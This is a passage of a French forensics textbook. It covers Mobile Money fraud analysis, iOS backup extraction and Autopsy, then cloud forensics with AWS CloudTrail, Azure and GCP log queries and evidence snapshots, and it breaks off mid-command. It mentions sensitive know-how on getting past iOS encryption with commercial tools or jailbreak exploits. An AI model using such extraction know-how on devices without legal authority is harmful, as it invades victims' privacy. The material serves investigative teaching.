Les fraudes Mobile Money représentent la majorité des affaires numériques
en Afrique subsaharienne. La forensique mobile appliquée à ces fraudes
présente des spécificités importantes.

\subsection{Où sont stockées les données Mobile Money}

\begin{tableaucours}{p{3.5cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Opérateur / Données} &
    \tableauHeader{Source primaire} &
    \tableauHeader{Source secondaire (réquisition)}
}
MTN MoMo. SMS de confirmation & \texttt{mmssms.db} &
    MTN Cameroun~; art.~57 Loi~2010 \\
MTN MoMo. Historique transactions &
    Application MTN MoMo (\texttt{/data/data/com.mtn.mobile.cm/}) &
    Réquisition MTN Cameroun (CELLCOM) \\
Orange Money. SMS &
    \texttt{mmssms.db} (SMS OTP, confirmations) &
    Orange Cameroun~; art.~57 Loi~2010 \\
Orange Money. Transactions &
    Application Orange Money &
    Réquisition Orange Cameroun \\
Historique USSD &
    Non stocké sur l'appareil & \textbf{Uniquement via l'opérateur}~;
    réquisition indispensable \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~16.3. Sources des données Mobile Money}\end{center}

\begin{boxoutils}{Extraction des SMS MoMo depuis mmssms.db}
\begin{lstlisting}[language=bash_forensique]
-- Tous les SMS de MTN MoMo (numeroMTN = +237 670 000 000)
SELECT
    datetime(date/1000, 'unixepoch', 'localtime') AS date_heure,
    address AS expediteur,
    body AS contenu_sms
FROM sms
WHERE address = '670000000'      -- numero MoMo MTN Cameroun
   OR address LIKE '+23767%'
   OR body LIKE '%MoMo%' OR body LIKE '%MTN%'
ORDER BY date;

-- Resultat type (fraude par phishing OTP) :
-- 2026-01-15 14:22:11  670000000
--   "Votre code OTP MoMo est 847293. Ne le partagez jamais."
-- 2026-01-15 14:22:45  670000000
--   "Vous avez envoye 250000 FCFA a 677XXXXXX. Solde : 12500 FCFA"

-- Reconstituer la chronologie d'une fraude MoMo
SELECT
    datetime(date/1000, 'unixepoch', 'localtime') AS date_heure,
    CASE type
        WHEN 1 THEN 'SMS recu'
        WHEN 2 THEN 'SMS envoye'
    END AS direction,
    body
FROM sms
WHERE (body LIKE '%OTP%' OR body LIKE '%code%'
    OR body LIKE '%envoye%' OR body LIKE '%recu%')
  AND date BETWEEN
    strftime('%s','2026-01-15 14:00:00')*1000 AND
    strftime('%s','2026-01-15 15:00:00')*1000
ORDER BY date;
\end{lstlisting}
\end{boxoutils}

\begin{boxPNC}
\textbf{Réquisition aux opérateurs Mobile Money~: que demander}

La réquisition judiciaire (art.~57 \loicam{2010/012}) à MTN ou Orange
pour une fraude MoMo doit précisément demander~:
\begin{enumerate}
    \item \textbf{Historique des transactions} du numéro victime
          sur la période (30~jours recommandés + 15~jours avant)~;
    \item \textbf{Identité et photo} associées au numéro bénéficiaire
          (numéro ayant reçu les fonds)~;
    \item \textbf{Logs de connexion} à l'application ou aux services
          USSD du numéro bénéficiaire~;
    \item \textbf{Carte SIM associée}~: série SIM (ICCID) et historique
          des échanges SIM (SIM~swapping)~;
    \item \textbf{IMEI} du téléphone utilisé avec ce numéro.
\end{enumerate}
\textbf{L'IMEI est la clé~:} si le fraudeur a changé de SIM mais
gardé son téléphone, l'IMEI identifie le téléphone physique à travers
les changements de numéro.
\end{boxPNC}

% ============================================================================
\section{Forensique iOS~: Spécificités et Limitations}
\label{sec:forensique-ios}
% ============================================================================

\subsection{Architecture et contraintes forensiques}

iOS présente une architecture de sécurité qui complique significativement
la forensique par rapport à Android~:

\begin{tableaucours}{p{3.5cm}p{4.0cm}p{4.0cm}}{%
    \tableauHeader{Mécanisme iOS} &
    \tableauHeader{Impact forensique} &
    \tableauHeader{Contournement}
}
Chiffrement hardware AES-256 & Toutes les données sont chiffrées
    sur la puce~; inaccessibles sans code PIN & Nécessite
    Cellebrite UFED ou GrayKey~; ou accès au code PIN \\
Secure Enclave & Stocke les clés de déchiffrement~;
    inaccessible même avec root &
    Impossible à contourner sans exploit spécifique \\
App Sandbox & Chaque application est isolée~;
    aucun accès inter-app sans jailbreak &
    Exploitation jailbreak (iOS 16--17) \\
Effacement après 10~erreurs & 10~tentatives PIN incorrectes
    $\to$ effacement total &
    \textbf{Ne jamais tenter le brute-force PIN manuellement} \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~16.4. Contraintes forensiques iOS}\end{center}

\subsection{Sauvegarde iTunes/Finder~: extraction logique iOS}

Si le téléphone est \textbf{déverrouillé} et que l'utilisateur fait
confiance à l'ordinateur de l'investigateur~:

\begin{boxoutils}{Extraction via sauvegarde iTunes (macOS/Windows)}
\begin{lstlisting}[language=bash_forensique]
# PREREQUIS : telephone deverrouille + "Faire confiance" accepte

# macOS -- sauvegarde via Finder
# Ouvrir Finder -> iPhone -> Sauvegarder maintenant
# Emplacement : ~/Library/Application Support/MobileSync/Backup/

# Windows -- sauvegarde via iTunes
# Emplacement : %APPDATA%\Apple Computer\MobileSync\Backup\

# Extraire la sauvegarde avec iMazing (ou outil forensique)
# ou parser manuellement avec libimobiledevice :
idevicebackup2 backup /output/ios_backup/

# Parser la sauvegarde iOS avec iBackupBot ou iPhone Backup Extractor
# Structure de la sauvegarde :
# - Manifest.db (SQLite) : inventaire de tous les fichiers
# - Manifest.plist : informations de l'appareil
# - <domain>/<hash> : fichiers individuels

# Interroger le Manifest.db
sqlite3 ~/Library/Application\ Support/MobileSync/Backup/<UDID>/Manifest.db
SELECT relativePath, domain, flags, fileID
FROM Files
WHERE relativePath LIKE '%Messages%'
ORDER BY relativePath;
\end{lstlisting}
\end{boxoutils}

\subsection{Analyse des bases iOS~: Messages et iCloud}

\begin{boxoutils}{Analyse de sms.db iOS (messages iMessage et SMS)}
\begin{lstlisting}[language=bash_forensique]
-- Localiser le fichier Messages dans la sauvegarde
-- Domain : HomeDomain, relativePath : Library/SMS/sms.db

-- Extraire les messages
sqlite3 /output/ios_backup/sms.db

SELECT
    datetime(date/1000000000 + 978307200, 'unixepoch',
        'localtime') AS date_heure,
    -- iOS date = secondes depuis 01/01/2001 (pas Unix epoch)
    CASE is_from_me
        WHEN 0 THEN h.id   -- expediteur (numero)
        WHEN 1 THEN 'Moi'
    END AS expediteur,
    text AS message
FROM message m
LEFT JOIN handle h ON h.rowid = m.handle_id
ORDER BY date;

-- Attention a l'epoch iOS : +978307200 secondes (offset 2001 vs 1970)

-- Contacts iOS (AddressBook.sqlitedb)
SELECT
    ABPerson.First, ABPerson.Last,
    ABMultiValue.value AS telephone
FROM ABPerson
JOIN ABMultiValue ON ABMultiValue.record_id = ABPerson.rowid
WHERE ABMultiValue.property = 3  -- propriete telephone
ORDER BY ABPerson.Last;
\end{lstlisting}
\end{boxoutils}

\begin{boiteRemarque}{L'epoch iOS~: piège fréquent}
iOS utilise une epoch différente de Unix~: les timestamps iOS sont
comptés \textbf{depuis le 1er~janvier~2001} (et non le
1er~janvier~1970). L'offset est de 978~307~200~secondes.
Ne pas appliquer cette conversion donne des dates situées en 1970,
erreur immédiatement identifiable mais qui fragilise un rapport non relu.
Pour les messages (iMessage), il faut en plus diviser par~$10^9$
(nanoseconde~$\to$ seconde).
\end{boiteRemarque}

% ============================================================================
\section{Autopsy pour la Forensique Mobile}
\label{sec:autopsy-mobile}
% ============================================================================

\termecle{Autopsy}\index{Autopsy} (Brian Carrier, Basis Technology)
intègre depuis la version~4 des modules d'analyse mobile qui automatisent
une grande partie des analyses SQLite présentées dans ce chapitre.

\begin{boxoutils}{Autopsy, analyse d'une extraction Android}
\begin{lstlisting}[language=bash_forensique]
# Workflow Autopsy pour forensique mobile :
# 1. New Case -> Add Data Source -> Logical Files
#    -> Selectionner le repertoire d'extraction ADB

# 2. Modules a activer :
#    - Android Analyzer : parse automatiquement mmssms.db, call_log,
#      contacts, browser history
#    - EXIF Parser : extrait toutes les metadonnees GPS
#    - Keyword Search : recherche de termes (numeros, noms, montants)
#    - Communication : reconstruit les conversations

# 3. Resultats automatiques :
#    Reports -> Data Artifacts -> Text Messages
#                              -> Call Logs
#                              -> Contacts
#                              -> GPS Tracks (carte interactive)

# Limitation importante :
# Autopsy ne peut parser que ce qui est ACCESSIBLE
# (extraction /sdcard)
# Pour /data/data (root requis), il faut l'image complete du FS
# via extraction physique (Cellebrite, UFED)

# Export du rapport HTML pour le dossier judiciaire :
# Generate Report -> HTML Report
# Inclut horodatages, sources, et résumé par artefact
\end{lstlisting}
\end{boxoutils}

\separateur

% --- Encadré lab NDAP SUKULU ---
\begin{boiteRemarque}{Notions mobilisées par le laboratoire INA-LAB-04}
\begin{itemize}
    \item \textbf{Dates Android}~: les bases (\texttt{mmssms.db},
          \texttt{calllog.db}) stockent les dates en millisecondes depuis
          le 1\textsuperscript{er}~janvier~1970, \emph{en UTC}. On divise
          par~1000 (\texttt{datetime(date/1000,'unixepoch')}), puis on
          ajoute l'heure légale du Cameroun (UTC$+$1). L'option
          \texttt{'localtime'} dépend du fuseau de la machine d'analyse~:
          la préciser dans le rapport.
    \item \textbf{Écart entre deux événements}~: la différence de deux champs
          \texttt{date}, divisée par~1000, donne des secondes~; un délai très
          court entre la réception d'un code OTP et un débit trahit un
          automate ou un complice en ligne.
    \item \textbf{Table des appels}~: le champ \texttt{type} distingue les
          appels entrants (1), sortants (2) et manqués (3)~; le champ
          \texttt{duration} est en secondes.
    \item \textbf{EXIF}~: \texttt{exiftool -n} affiche les coordonnées en
          degrés décimaux, à reporter sur une carte~; le modèle d'appareil
          figure dans le champ \texttt{Model}.
\end{itemize}
\end{boiteRemarque}

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item \textbf{Limite ADB sans root~:} \texttt{adb pull /sdcard/}
          donne les médias et backups WhatsApp, mais pas les messages
          chiffrés ni les données \texttt{/data/data}. La sauvegarde
          \texttt{adb backup -all -apk} peut donner accès aux données
          applicatives selon les réglages de l'application.

    \item \textbf{SQLite = c\oe ur de l'analyse mobile~:} SMS
          (\texttt{mmssms.db}), WhatsApp (\texttt{msgstore.db}),
          appels, contacts, navigateur -- tout est en SQLite.
          Les requêtes de ce chapitre sont directement réutilisables
          en investigation.

    \item \textbf{WhatsApp~:} médias en clair sur \texttt{/sdcard/WhatsApp/Media/}~;
          messages chiffrés dans \texttt{.crypt15}. Clé dans
          \texttt{/data/data/com.whatsapp/files/key} (root requis).
          Documenter la situation dans le rapport~: ``messages non
          déchiffrés faute de clé accessible''.

    \item \textbf{EXIF GPS}~: chaque photo peut contenir des
          coordonnées GPS précises. Utiliser \texttt{exiftool -csv -GPS*}
          pour extraire en masse~; visualiser sur OpenStreetMap.

    \item \textbf{Mobile Money}~: fraudes MoMo~$\to$ toujours
          analyser \texttt{mmssms.db} (SMS OTP~; confirmations
          de transactions) ET requérir les logs opérateur
          (art.~57 Loi~2010). L'IMEI du téléphone fraudeur
          est la clé de l'identification même si la SIM a changé.

    \item \textbf{iOS~:} ne jamais tenter le brute-force PIN
          (10~erreurs~$\to$ effacement). Extraction via sauvegarde
          iTunes si téléphone déverrouillé. Attention à l'epoch
          iOS~: offset +978~307~200~secondes vs Unix.

    \item \textbf{Autopsy~:} automatise l'analyse des extractions
          Android (SMS, appels, GPS, contacts, navigateur). Limitation~:
          ne traite que ce qui est accessible (pas le \texttt{/data/data}
          sans root).
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~16.1. Requêtes SQLite \niveaubase}]
Vous disposez de \texttt{mmssms.db} extrait du téléphone de BELLO Armand
(Opération TANGUE). Rédigez les requêtes SQLite permettant de~:
\begin{enumerate}[(a)]
    \item Lister tous les SMS reçus entre le 1\textsuperscript{er} et
          le 15~mars~2026, avec horodatage lisible et expéditeur.
    \item Extraire tous les SMS contenant les mots ``code'', ``OTP'',
          ou ``virement''.
    \item Calculer le nombre de SMS échangés avec le numéro
          \texttt{+237677XXXXXX} par jour (un résultat par jour).
    \item Identifier tous les SMS d'un expéditeur qui a envoyé
          plus de 50~messages en un seul jour (indicateur d'automatisation).
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~16.2. Fraude MoMo \niveaumoyen}]
Dans l'affaire BAOBAB, la victime FOUDA Clément a perdu 250~000~FCFA.
L'analyse de son téléphone révèle les SMS suivants dans \texttt{mmssms.db}~:
\begin{lstlisting}[language=bash_forensique]
-- Extrait :
date_heure            expediteur    contenu
2026-01-15 14:22:11   670000000
    "Votre code OTP MoMo est 847293. Ne le partagez jamais."
2026-01-15 14:22:15   +237677000123
    "Salut. Je travaille chez MTN. Donnez-moi votre code pour
     verifier votre compte."
2026-01-15 14:22:45   670000000
    "Vous avez envoye 250000 FCFA a 677000123. Solde : 3400 FCFA"
\end{lstlisting}
\begin{enumerate}[(a)]
    \item Qualifiez juridiquement les infractions commises (articles
          précis des Lois~2010 et~2024).
    \item Que demandez-vous dans la réquisition à MTN Cameroun~?
          Listez les 5~informations indispensables.
    \item Comment l'IMEI peut-il aider l'enquête si le fraudeur
          a changé de SIM après la fraude~?
    \item Rédigez la constatation forensique correspondante à partir
          des SMS ci-dessus, en appliquant la distinction
          constatation/interprétation.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~16.3. Investigation mobile complète \niveauexpert}]
Vous avez en custody le téléphone Samsung Galaxy A53 de MBONGO Joseph
(EV-002, Chapitre~8~(UE~SEC4031)). L'extraction ADB a produit
les données suivantes dans \texttt{/output/extraction\_EV002/}~:
\begin{itemize}
    \item \texttt{/sdcard/} (photos, téléchargements, backups WhatsApp)~;
    \item \texttt{mmssms.db}, \texttt{call\_log.db}, \texttt{contacts2.db}~;
    \item \texttt{/sdcard/WhatsApp/Databases/msgstore.db.crypt15}~;
    \item \texttt{/sdcard/WhatsApp/Media/WhatsApp Images/} (23~images).
\end{itemize}
\begin{enumerate}[(a)]
    \item Planifiez l'analyse~: dans quel ordre analyser ces sources~?
          Quelle question investigative posez-vous à chaque source~?
    \item Les messages WhatsApp sont dans \texttt{.crypt15} (chiffrés).
          Quelles sont vos options légales et techniques pour y accéder~?
          Que documentez-vous si l'accès est impossible~?
    \item \texttt{exiftool} révèle que la photo
          \texttt{IMG-20260115-WA0003.jpg} a des coordonnées GPS
          situées à 200~mètres du siège de SONATRAV~SA à 14h28.
          L'affaire principale concerne un virement frauduleux
          depuis les comptes de SONATRAV. Quelle valeur probatoire
          accordez-vous à cette photo~? Rédigez la constatation et
          l'analyse correspondantes.
    \item Rédigez la section ``Artefacts mobiles'' du rapport d'expertise,
          couvrant les 4~sources analysées, avec pour chacune~:
          méthode d'extraction, artefacts trouvés, valeur probatoire.
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Transition.} Une grande partie des données du téléphone
ne réside plus sur l'appareil~: sauvegardes, messageries et comptes
sont synchronisés chez des fournisseurs étrangers. Le chapitre
suivant traite cette forensique du cloud. Plus loin, le
Chapitre~\ref{chap:anti-for} (Anti-Forensique et Contre-Mesures)
reviendra sur les techniques d'effacement propres aux téléphones
(factory reset, applications «~vault~», suppression sélective) et
sur la manière d'en documenter l'existence.
\end{boxinfo}

       
        % ============================================================================
% Fichier  : partie4/P04_C17_forensique_cloud.tex
% Titre    : Forensique Cloud
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% ============================================================================

\chapter{Forensique Cloud}
\label{chap:for-cloud}

\epigraph{%
    « The cloud is just someone else's computer. »%
}{Adage des administrateurs système}

\niveauChapitre{Expert}{%
    Chapitres~10~(UE~SEC4031) (portails LEA, Budapest),
    11~(UE~SEC4031) (CLOUD Act~\cite{cloudact2018}, SCA, RGPD~\cite{rgpd2016}) et
    \ref{chap:for-res} (logs, corrélation) indispensables.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Comprendre les modèles de service cloud (SaaS, PaaS, IaaS)
          et leur impact sur la disponibilité des preuves forensiques.
    \item Identifier les logs disponibles sur les trois grandes
          plateformes (AWS, Azure, Google Cloud) et leur contenu
          forensique.
    \item Formuler des demandes structurées aux portails LEA des
          grands fournisseurs~; obtenir et analyser les réponses.
    \item Analyser les journaux AWS CloudTrail et Azure Activity Log
          pour reconstituer une chronologie d'attaque cloud.
    \item Gérer la tension entre éphéméralité des données cloud
          et exigences probatoires de persistance.
    \item Coordonner une investigation cloud impliquant plusieurs
          juridictions et fournisseurs.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{Le problème central de la forensique cloud}
% ============================================================================

La forensique cloud pose trois défis que les investigations classiques
ne posent pas~:

\begin{enumerate}
    \item \textbf{Souveraineté diffuse}~: les données sont stockées dans
          des datacenters dont la localisation peut changer dynamiquement
          et dépend du fournisseur, pas de l'enquêteur. Qui a juridiction~?
    \item \textbf{Éphéméralité}~: les instances cloud peuvent être
          détruites en secondes, emportant toutes leurs données. La fenêtre
          d'acquisition est souvent de minutes, pas d'heures.
    \item \textbf{Multi-tenancy}~: les données de plusieurs clients
          coexistent sur la même infrastructure physique~; l'isolement
          est logique, pas physique.
\end{enumerate}

\separateur

% ============================================================================
\section{Modèles de Service et Disponibilité des Preuves}
\label{sec:modeles-cloud}
% ============================================================================

Le modèle de service détermine qui contrôle quoi et donc qui peut
fournir quelles preuves à la demande de l'investigateur.

\begin{tableaucours}{p{2.5cm}p{3.0cm}p{3.0cm}p{3.5cm}}{%
    \tableauHeader{Modèle} &
    \tableauHeader{Ce que gère le client} &
    \tableauHeader{Ce que gère le fournisseur} &
    \tableauHeader{Preuves disponibles via LEA}
}
\textbf{SaaS} (Gmail, Office~365, Dropbox) &
    Ses données uniquement &
    Tout (infra, OS, appli, logs) &
    Logs de connexion, métadonnées, contenu (MLAT/warrant) \\
\textbf{PaaS} (Heroku, Google App Engine) &
    Code applicatif, données &
    Infra, OS, runtime &
    Logs plateforme + logs applicatifs si conservés \\
\textbf{IaaS} (AWS EC2, Azure VM, GCP Compute) &
    OS, appli, données, logs &
    Physique, hyperviseur &
    Logs de la couche cloud uniquement~; logs OS~= réquisition
    au client (ou saisie du compte) \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~17.1. Modèles cloud et disponibilité des preuves}\end{center}

\begin{boiteRemarque}{Implication pratique~: SaaS est plus simple que IaaS}
Paradoxalement, l'investigation d'un compte Gmail (SaaS) est plus
directe qu'une instance AWS compromise (IaaS). Pour Gmail, une demande
au portail LEA Google suffit pour les métadonnées~; pour une instance
EC2, le fournisseur ne voit pas le contenu des VMs il faut soit
accéder au compte AWS compromis, soit saisir légalement l'instance.
\end{boiteRemarque}

% ============================================================================
\section{Logs Cloud~: ce qui Existe et où le Trouver}
\label{sec:logs-cloud}
% ============================================================================

\subsection{AWS CloudTrail~: l'audit complet des API}

\termecle{AWS CloudTrail}\index{CloudTrail} enregistre chaque appel API
effectué sur un compte AWS~: qui a fait quoi, quand, depuis quelle IP.
C'est le journal d'audit le plus complet du cloud AWS.

\begin{boxoutils}{Analyse AWS CloudTrail}
\begin{lstlisting}[language=bash_forensique]
# CloudTrail stocke ses logs dans S3 au format JSON (gzip)
# Structure d'un log CloudTrail type :
# {
#   "eventTime": "2026-03-13T02:15:33Z",
#   "eventSource": "ec2.amazonaws.com",
#   "eventName": "DescribeInstances",
#   "userIdentity": {
#     "type": "IAMUser",
#     "userName": "admin",
#     "arn": "arn:aws:iam::123456789:user/admin"
#   },
#   "sourceIPAddress": "185.220.XX.XX",
#   "userAgent": "aws-cli/2.11.0 Python/3.11.0"
# }

# Telecharger et analyser les logs CloudTrail avec AWS CLI
aws s3 ls s3://mon-bucket-cloudtrail/AWSLogs/123456789/
aws s3 sync s3://mon-bucket-cloudtrail/ /output/cloudtrail/

# Analyser avec jq (JSON query)
# Toutes les actions depuis une IP suspecte
cat /output/cloudtrail/*.json.gz | gunzip | \
    jq -r 'select(.sourceIPAddress == "185.220.XX.XX") |
    [.eventTime, .eventName, .userIdentity.userName,
     .sourceIPAddress] | @csv'

# Actions de creation/suppression d'instances (indicateurs)
cat /output/cloudtrail/*.json.gz | gunzip | \
    jq -r 'select(.eventName | test("RunInstances|TerminateInstances|
        CreateUser|DeleteUser|AttachUserPolicy")) |
    [.eventTime, .eventName, .userIdentity.userName,
     .sourceIPAddress] | @csv'

# Verifier si CloudTrail a ete desactive (anti-forensique cloud)
cat /output/cloudtrail/*.json.gz | gunzip | \
    jq -r 'select(.eventName ==
        "StopLogging" or .eventName == "DeleteTrail") |
    [.eventTime, .eventName, .userIdentity.userName] | @csv'
# Trouver "StopLogging" dans les logs -> tentative d'anti-forensique
\end{lstlisting}
\end{boxoutils}

\begin{boxscenario}{CloudTrail, reconstitution d'une compromission AWS MVOM}
L'analyse des logs CloudTrail du compte AWS de TRANSBOIS~SA révèle
la séquence suivante~:

\begin{lstlisting}[language=bash_forensique]
# Timeline CloudTrail filtree sur 13/03/2026 02h00-03h00
02:13:45  AssumeRole       IP:185.220.XX.XX  Role:EC2-Admin
02:14:03  DescribeInstances IP:185.220.XX.XX  User:admin
02:14:11  GetConsoleOutput  IP:185.220.XX.XX  Instance:i-0a1b2c3d4e
02:16:02  RunInstances      IP:185.220.XX.XX  Type:t2.xlarge
          # Lancement d'une instance suspecte
02:17:55  PutObject         IP:185.220.XX.XX  Bucket:transbois-backup
          # Exfiltration vers S3 (45 Mo)
02:19:48  StopLogging       IP:185.220.XX.XX
          # TENTATIVE SUPPRESSION DES LOGS CloudTrail
02:19:49  [CloudTrail arrêté -- fenêtre aveugle]
02:23:11  TerminateInstances  # Instance suspecte detruite
\end{lstlisting}

\textbf{Constatation~:} L'action \texttt{StopLogging} à 02h19:49 a
interrompu la journalisation CloudTrail. Cependant, les logs antérieurs
(02h13--02h19) sont déjà enregistrés dans S3 et ne peuvent pas être
rétroactivement effacés si le bucket S3 est protégé
(\textit{Object Lock / WORM}), ce qui est le cas ici.
\textbf{L'anti-forensique cloud a échoué car les logs étaient
en écriture unique.}
\end{boxscenario}

\subsection{Azure Activity Log et Azure AD Sign-In Logs}

\begin{boxoutils}{Analyse Azure Activity Log et Sign-In}
\begin{lstlisting}[language=bash_forensique]
# Azure CLI -- extraire les logs d'activite
az monitor activity-log list \
    --start-time "2026-03-13T02:00:00Z" \
    --end-time "2026-03-13T03:00:00Z" \
    --output json > /output/azure_activity.json

# Analyser avec jq
cat /output/azure_activity.json | jq -r \
    '.[] | [.eventTimestamp, .operationName.value,
    .caller, .properties.statusCode] | @csv'

# Azure AD Sign-In Logs (tentatives de connexion)
# Via Azure Portal -> Azure Active Directory -> Sign-ins
# Ou via Microsoft Graph API :
curl -H "Authorization: Bearer $TOKEN" \
    "https://graph.microsoft.com/v1.0/auditLogs/signIns?\
    \$filter=createdDateTime ge 2026-03-13T02:00:00Z and
    createdDateTime le 2026-03-13T03:00:00Z" \
    > /output/azure_signins.json

cat /output/azure_signins.json | jq -r \
    '.value[] | [.createdDateTime, .userDisplayName,
    .ipAddress, .status.errorCode, .location.city] | @csv'
# errorCode 0 = succes, 50126 = mot de passe incorrect, etc.
\end{lstlisting}
\end{boxoutils}

\subsection{Google Cloud Logging~: Cloud Audit Logs}

\begin{lstlisting}[language=bash_forensique,
    caption={Google Cloud Audit Logs, analyse forensique}]
# Google Cloud Logging via gcloud CLI
gcloud logging read \
    "timestamp >= \"2026-03-13T02:00:00Z\"
     AND timestamp <= \"2026-03-13T03:00:00Z\"
     AND protoPayload.methodName:(
        \"compute.instances.insert\"
        OR \"compute.instances.delete\"
        OR \"storage.buckets.create\")
     AND protoPayload.authenticationInfo.principalEmail != \"\"" \
    --project=mon-projet \
    --format=json > /output/gcp_audit.json

# Extraire les createurs de ressources (qui a lance quoi)
cat /output/gcp_audit.json | python3 -c "
import json, sys
for entry in json.load(sys.stdin):
    pp = entry.get('protoPayload', {})
    print(
        entry.get('timestamp',''),
        pp.get('methodName',''),
        pp.get('authenticationInfo',{}).get('principalEmail',''),
        pp.get('requestMetadata',{}).get('callerIp','')
    )
"
\end{lstlisting}

% ============================================================================
\section{Obtenir des Preuves Auprès des Fournisseurs SaaS}
\label{sec:preuve-saas}
% ============================================================================

\subsection{Structurer une demande au portail LEA}

Le Chapitre~10~(UE~SEC4031) (Section~10.5~(UE~SEC4031)) a
présenté les portails LEA. Ce chapitre approfondit la \emph{structure}
de la demande elle-même, les éléments sans lesquels elle sera
systématiquement rejetée.

\begin{tableaucours}{p{3.5cm}p{8.0cm}}{%
    \tableauHeader{Champ obligatoire} &
    \tableauHeader{Contenu requis et formulation recommandée}
}
\textbf{Type de demande} &
    Preservation Request (urgence)~; Production Request (standard)~;
    Emergency Request (menace imminente). Choisir le bon type~:
    une Production sans Preservation préalable arrive souvent après
    que les données ont été effacées. \\
\textbf{Identifiants du compte} &
    Adresse email, numéro de téléphone, URL du profil, IMEI associé.
    Toujours donner au moins deux identifiants croisés pour lever
    l'ambiguïté. \\
\textbf{Base légale} &
    Citer explicitement~: art.~52 et~57 \loicam{2010/012}~\cite{cameroun2010a}~;
    Budapest art.~16--17 si l'État requis est partie~;
    SCA 18~U.S.C.~\S~2703 pour fournisseurs US. \\
\textbf{Qualification de l'infraction} &
    Description factuelle + qualification juridique des deux pays
    (double incrimination). Pour un fournisseur US~: citer le CFAA. \\
\textbf{Période visée} &
    Date de début et de fin précises. Éviter les demandes ouvertes
    (``toute la vie du compte'')~: systématiquement rejetées. \\
\textbf{Données demandées} &
    Distinguer métadonnées (abonné, connexion) et contenu~:
    les métadonnées s'obtiennent sans warrant~; le contenu nécessite
    un MLAT ou équivalent. \\
\textbf{Coordonnées de contact} &
    Nom, titre, email officiel, numéro de téléphone direct.
    Les réponses urgentes vont directement à ce contact. \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~17.2. Éléments obligatoires d'une demande LEA}\end{center}

\subsection{Analyser la réponse d'un fournisseur}

\begin{boxoutils}{Traitement d'une réponse Google (métadonnées Gmail)}
\begin{lstlisting}[language=bash_forensique]
# Structure typique d'une reponse Google aux autorites
# (format JSON ou fichier texte structure)
# Exemple : reponse pour un compte Gmail suspect

# 1. Informations d'abonne (disponibles sans warrant)
{
  "accountEmail": "suspect.wouri@gmail.com",
  "googleId": "123456789012345678901",
  "accountCreated": "2025-12-28T10:15:22Z",
  "lastLoginDate": "2026-01-15T14:35:11Z",
  "recoveryEmail": "autre.compte@yahoo.fr",
  "recoveryPhone": "+23365XXXXXXX",
  "services": ["Gmail", "Google Drive", "Google Photos"]
}

# 2. Logs de connexion (disponibles sans warrant)
[
  {"loginTime": "2026-01-15T14:28:01Z",
   "ipAddress": "41.82.XXX.XXX",       # IP senegale (Sonatel)
   "loginType": "GOOGLE_LOGIN",
   "success": true},
  {"loginTime": "2026-01-15T14:35:09Z",
   "ipAddress": "41.82.XXX.XXX",
   "loginType": "GMAIL_SMTP_AUTH",
   "success": true}
]

# Croiser avec la capture reseau WOURI (Ch. 15) :
# Email SMTP envoye depuis contact@medequip-portugal.com a 14h28:03
# Connexion Gmail depuis IP senegalaise a 14h28:01
# -> le compte suspect s'est connecte 2 secondes avant l'envoi
\end{lstlisting}
\end{boxoutils}

\begin{boxjuris}
\textbf{Valeur probatoire d'une réponse de fournisseur}

Une réponse d'un fournisseur US (Google, Meta, Microsoft) à une
demande LEA constitue un \textit{business record} au sens de la
FRE~Rule~803(6) (Chapitre~11~(UE~SEC4031)). Elle est directement
admissible en droit américain. En droit camerounais~:
\begin{itemize}
    \item Considérée comme un document étranger authentifié~;
    \item Nécessite l'attestation d'un expert judiciaire expliquant
          le processus de génération et la fiabilité du système~;
    \item Hash SHA-256 du fichier reçu à calculer et documenter
          immédiatement (custody numérique des réponses LEA,
          cf. Ch.~8~(UE~SEC4031)).
\end{itemize}
\end{boxjuris}

% ============================================================================
\section{Gérer l'Éphéméralité~: Conservation d'Urgence}
\label{sec:ephemerality}
% ============================================================================

\subsection{Le problème de la rétention limitée}

Les données cloud ont des durées de vie variables selon les fournisseurs~:

\begin{tableaucours}{p{3.5cm}p{3.5cm}p{4.5cm}}{%
    \tableauHeader{Type de donnée} &
    \tableauHeader{Durée de rétention typique} &
    \tableauHeader{Action à entreprendre}
}
Logs de connexion IP & 30--90~jours selon fournisseur &
    Demande de conservation \textbf{immédiate} via art.~29 Budapest
    ou portail LEA \\
Contenu emails supprimés & 30~jours (corbeille) puis effacé &
    Preservation Request \textbf{avant} la fin des 30~jours \\
Instances cloud éteintes & Selon configuration (souvent~: 7~jours) &
    Saisie immédiate ou snapshot forensique \\
Données Snap/Telegram & Heures à jours &
    Urgence absolue~; canal INTERPOL 24/7 \\
Transactions financières & Souvent 5--10~ans (réglementation AML) &
    Standard MLAT acceptable \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~17.3. Durées de rétention et urgence d'action}\end{center}

\subsection{Snapshot forensique d'une instance cloud}

Quand l'investigateur a accès au compte cloud compromis (ou que le
suspect est le propriétaire du compte et coopère), le snapshot est
l'équivalent cloud de l'image E01~:

\begin{boxoutils}{Snapshot forensique AWS / GCP}
\begin{lstlisting}[language=bash_forensique]
# AWS -- snapshot d'un volume EBS (disque de VM)
# PREREQUIS : acces au compte AWS (credentials)

# 1. Identifier le volume de l'instance
aws ec2 describe-instances --instance-ids i-0a1b2c3d4e \
    --query 'Reservations[].Instances[].BlockDeviceMappings[].Ebs.VolumeId'
# Resultat : vol-0xyz789abc

# 2. Creer un snapshot (image read-only du volume)
aws ec2 create-snapshot --volume-id vol-0xyz789abc \
    --description "Forensic snapshot MVOM 2026-03-13 OPJ OLINGA"
# Resultat : snap-0forensic123

# 3. Copier le snapshot dans un compte forensique isole
aws ec2 copy-snapshot --source-region eu-west-1 \
    --source-snapshot-id snap-0forensic123 \
    --region eu-west-1 \
